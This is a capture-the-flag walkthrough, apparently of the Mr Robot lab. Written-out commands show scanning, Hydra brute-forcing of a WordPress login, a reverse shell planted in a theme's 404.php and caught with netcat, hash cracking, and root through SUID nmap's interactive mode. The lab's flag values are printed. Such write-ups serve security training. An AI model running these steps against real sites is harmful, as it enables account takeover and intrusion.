#### IP `10.10.59.244`

#### 1. Nmap scan

```
$ nmap -Pn -A 10.10.33.112

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 04:04 EST
Nmap scan report for 10.10.33.112
Host is up (0.29s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.30 seconds
```

There are three ports: 22,80,443



#### 2. Gobuster 

```
/readme (Status: 200)
/rdf (Status: 301)
/robots (Status: 200)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/wp-login
```

What seems interesting is /robots and /wp-login




#### 3. Checking /robots.txt

I find two files:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
and get first key. Second file `fsocity.dic` is a dictionary which I download to my machine.

#### 4. Access to Wordpress

I wanted to find out how site reads username / password with Burp first and typed admin / admin:

```
POST /wp-login.php HTTP/1.1
Host: 10.10.33.112
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://10.10.33.112
Connection: close
Referer: http://10.10.33.112/wp-login.php
Cookie: s_cc=true; s_fid=2A158C002CF358F0-25A61CA879F5E5F4; s_nr=1610616559555; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.33.112%2Fwp-admin%2F&testcookie=1
```

so `log` is username and `pwd` password.

If we type bad user name we get response "Invalid username" so using hydra:

`hydra -L /home/kali/Documents/THM/Mr_Robot/fsocity.dic -p test 10.10.33.112 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^: Invalid username" -t 30`

we get username `Ellliot`

`[80][http-post-form] host: 10.10.33.112   login: Elliot   password: test`

so now let's keep `Elliot` and bruteforce password:

`hydra -l Elliot -P fsocity.dic  10.10.33.112 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30`

After some time I find password `E28-0652`



#### 5. Login to wordpress and reverse shell

Very commong technique is to modify a Theme by uploading pentestlonkey's reverse shell, running netcat and accessing modified  file:

`http://10.10.33.112/wp-content/themes/twentyfifteen/404.php`

here we go:

```
sudo nc -lvnp 4444        
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.6.46.150] from (UNKNOWN) [10.10.33.112] 35540


$ python3 -c 'import pty;pty.spawn("/bin/bash")'   
daemon@linux:/$ 
daemon@linux:/$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@linux:/$ 
```

#### 6. Enumeration

There is a file in /home/robot that we can cat and which is looks like a password for another user:

```
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

So I go to crackstationn type the hash and get`abcdefghijklmnopqrstuvwxyz`

```
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ whoami
whoami
robot
robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

I can get a second key:

```
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

#### 7. Escalate to root

Usually it is good to run linpeas.sh (long version) or try to quickly search for suuid files:

```
robot@linux:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
```

I am lucky as /usr/local/bin/nmap seems to be ineresting, because old versions of nmapenable getting easily root.

```
robot@linux:/$ nmap --version
nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```
Great, so:

```
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami 
whoami
root
# cd /root
cd /root

# ls -al
ls -al
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd


# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 
```

/FIN

